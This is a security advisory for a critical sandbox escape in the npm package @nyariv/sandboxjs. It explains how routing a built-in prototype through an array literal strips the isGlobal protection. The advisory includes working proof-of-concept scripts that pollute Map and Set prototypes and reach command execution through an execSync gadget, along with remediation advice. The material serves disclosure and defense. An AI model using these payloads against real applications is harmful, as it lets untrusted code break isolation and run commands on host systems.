# [C] @nyariv/sandboxjs has host prototype pollution from sandbox via array intermediary (sandbox escape)

## Summary
Severity: Critical
Advisory: GHSA-ww7g-4gwx-m7wj
CVE: CVE-2026-25881
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-10
Source: https://github.com/advisories/GHSA-ww7g-4gwx-m7wj
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.31

## Details
### Summary
A sandbox escape vulnerability allows sandboxed code to mutate host built-in prototypes by laundering the `isGlobal` protection flag through array literal intermediaries. When a global prototype reference (e.g., `Map.prototype`, `Set.prototype`) is placed into an array and retrieved, the `isGlobal` taint is stripped, permitting direct prototype mutation from within the sandbox. This results in persistent host-side prototype pollution and may enable RCE in applications that use polluted properties in sensitive sinks (example gadget: `execSync(obj.cmd)`).

### Details
#### Root Cause:
The sandbox implements a protection mechanism using the `isGlobal` flag in the Prop class to prevent modification of global objects and their prototypes. However, this taint tracking is lost when values pass through array/object literal creation.

#### Vulnerable Code Path `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):
```ts
addOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {
  const items = (b as LispItem[])
    .map((item) => {
      if (item instanceof SpreadArray) {
        return [...item.item];
      } else {
        return item;
      }
    })
    .flat()
    .map((item) => valueOrProp(item, context));  // <- isGlobal flag lost here
  done(undefined, items);
});
```
#### Exploitation Flow:
```txt
Sandboxed code: const m=[Map.prototype][0]
              ↓
Array creation: isGlobal taint stripped via valueOrProp()
              ↓
Prototype mutation: m.cmd='id' (host prototype polluted)
              ↓
Host-side impact: new Map().cmd === 'id' (persistent)
              ↓
RCE (application-dependent): host code calls execSync(obj.cmd)
```

#### Protection Bypass Location `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):
```ts
set(key: string, val: unknown) {
  // ...
  if (prop.isGlobal) {  // <- This check is bypassed
    throw new SandboxError(`Cannot override global variable '${key}'`);
  }
  (prop.context as any)[prop.prop] = val;
  return prop;
}
```
When the prototype is accessed via array retrieval, the `isGlobal` flag is no longer set, so this protection is never triggered.

### PoC
#### Prototype pollution via array intermediary:
```js
const Sandbox = require('@nyariv/sandboxjs').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const arr=[Map.prototype];
  const p=arr[0];
  p.polluted='pwned';
  return 'done';
`)().run();

console.log('polluted' in ({}), new Map().polluted);
```
**Observed output**: `false pwned`

#### Overwrite `Set.prototype.has`:
```js
const Sandbox = require('@nyariv/sandboxjs').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const s=[Set.prototype][0];
  s.has=isFinite;
  return 'done';
`)().run();

console.log('has overwritten:', Set.prototype.has === isFinite);
```

**Observed output**: `has overwritten: true`

#### RCE via host gadget (prototype pollution -> execSync):
```js
const Sandbox = require('@nyariv/sandboxjs').default;
const { execSync } = require('child_process');
const sandbox = new Sandbox();

sandbox.compile(`
  const m=[Map.prototype][0];
  m.cmd='id';
  return 'done';
`)().run();

const obj = new Map();
const out = execSync(obj.cmd, { encoding: 'utf8' }).trim();
console.log(out);
```

**Observed output**: `uid=501(user) gid=20(staff) groups=20(staff),...`

### Impact
This is a sandbox escape: untrusted sandboxed code can persistently mutate host built-in prototypes (e.g., `Map.prototype`, `Set.prototype`), breaking isolation and impacting subsequent host execution. RCE is possible in applications that later use attacker-controlled (polluted) properties in sensitive sinks (e.g., passing `obj.cmd` to `child_process.execSync`).

**Affected Systems**: any application using `@nyariv/sandboxjs` to execute untrusted JavaScript.

### Remediation
- Preserve `isGlobal` protection across array/object literal creation (do not unwrap `Prop` into raw values in a way that drops the global/prototype taint).
- Add a hard block on writes to built-in prototypes (e.g., `Map.prototype`, `Set.prototype`, etc.) even if they are obtained indirectly through literals.
- Defense-in-depth: freeze built-in prototypes in the host process before running untrusted code (may be breaking for some consumers).

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-ww7g-4gwx-m7wj
- https://nvd.nist.gov/vuln/detail/CVE-2026-25881
- https://github.com/nyariv/SandboxJS/commit/f369f8db26649f212a6a9a2e7a1624cb2f705b53
- https://github.com/nyariv/SandboxJS
